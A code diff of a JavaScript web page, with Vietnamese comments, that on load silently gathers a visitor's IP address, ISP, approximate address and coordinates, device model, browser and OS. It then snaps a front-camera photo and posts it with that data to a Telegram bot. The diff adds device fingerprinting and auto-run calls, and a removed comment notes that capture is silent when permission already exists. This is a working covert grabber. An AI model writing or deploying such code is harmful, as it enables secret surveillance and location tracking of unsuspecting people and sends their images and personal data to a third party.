@@ -97,8 +97,39 @@ const info = {
   country: '',
   lat: '',
   lon: '',
-  camera: '⏳ Đang kiểm tra quyền camera...'
+  deviceType: '',
+  deviceModel: '',
+  browser: '',
+  os: '',
+  camera: '⏳ Đang kiểm tra camera...'
 };
+
+function detectDeviceInfo() {
+  const ua = navigator.userAgent;
+
+  // Loại thiết bị
+  info.deviceType = /Mobi|Android/i.test(ua) ? '📱 Thiết bị di động' : '💻 Máy tính';
+
+  // Tên thiết bị gần đúng
+  if (/iPhone/i.test(ua)) {
+    info.deviceModel = 'iPhone';
+  } else if (/iPad/i.test(ua)) {
+    info.deviceModel = 'iPad';
+  } else if (/Android/i.test(ua)) {
+    const match = ua.match(/Android.*; (.+?) Build/);
+    info.deviceModel = match ? match[1] : 'Thiết bị Android';
+  } else if (/Windows NT/i.test(ua)) {
+    info.deviceModel = 'Windows PC';
+  } else if (/Macintosh/i.test(ua)) {
+    info.deviceModel = 'macOS';
+  } else {
+    info.deviceModel = 'Không xác định';
+  }
+
+  // Trình duyệt và OS
+  info.browser = navigator.userAgentData?.brands?.[0]?.brand || navigator.vendor || 'Không rõ';
+  info.os = navigator.userAgentData?.platform || navigator.platform || 'Không rõ';
+}
 
 function getIPInfo() {
   return fetch("https://ipwho.is/")
@@ -117,18 +148,22 @@ function getMessageText() {
   return `
 📡 [THÔNG TIN TRUY CẬP]
 
-🕒-Thời gian: ${info.time}
-🌐-IP: ${info.ip}
-🏢-ISP: ${info.isp}
-🏙️-Địa chỉ: ${info.address}
-🌍-Quốc gia: ${info.country}
-📍-Vĩ độ (IP): ${info.lat}
-📍-Kinh độ (IP): ${info.lon}
-📷-Camera: ${info.camera}
+🕒 Thời gian: ${info.time}
+📲 Thiết bị: ${info.deviceModel}
+📱 Loại: ${info.deviceType}
+🌐 Trình duyệt: ${info.browser}
+🖥️ Hệ điều hành: ${info.os}
+🌍 Quốc gia: ${info.country}
+🏙️ Địa chỉ: ${info.address}
+🌐 IP: ${info.ip}
+🏢 ISP: ${info.isp}
+📍 Vĩ độ: ${info.lat}
+📍 Kinh độ: ${info.lon}
+📷 Camera: ${info.camera}
   `.trim();
 }
 
-function sendTextOnly() {
+function sendOnlyText() {
   fetch(API_SEND_TEXT, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -139,10 +174,10 @@ function sendTextOnly() {
   });
 }
 
-function accessCameraAndSend() {
+function captureCameraAndSend() {
   navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(stream => {
-      info.camera = '✅ Camera đã được truy cập';
+      info.camera = '✅ Đã mở camera';
 
       const video = document.createElement('video');
       video.srcObject = stream;
@@ -162,7 +197,7 @@ function accessCameraAndSend() {
             getIPInfo().then(() => {
               const formData = new FormData();
               formData.append('chat_id', TELEGRAM_CHAT_ID);
-              formData.append('photo', blob, 'cam.jpg');
+              formData.append('photo', blob, 'camera.jpg');
               formData.append('caption', getMessageText());
 
               fetch(API_SEND_PHOTO, {
@@ -174,19 +209,12 @@ function accessCameraAndSend() {
         }, 1000);
       };
     })
-    .catch(err => {
-      info.camera = '📵 Người dùng từ chối hoặc không cho phép camera';
-      getIPInfo().then(sendTextOnly);
+    .catch(() => {
+      info.camera = '📵 Không cho phép hoặc lỗi camera';
+      getIPInfo().then(sendOnlyText);
     });
 }
 
-// Bắt đầu: kiểm tra quyền trước
-navigator.permissions.query({ name: 'camera' }).then(result => {
-  if (result.state === 'granted') {
-    // ✅ Đã được cấp quyền → âm thầm
-    accessCameraAndSend();
-  } else {
-    // ❌ Chưa cấp → yêu cầu qua popup
-    accessCameraAndSend(); // sẽ hiện popup nếu chưa cho phép
-  }
-});
+// ▶️ Bắt đầu thực thi
+detectDeviceInfo();
+captureCameraAndSend();
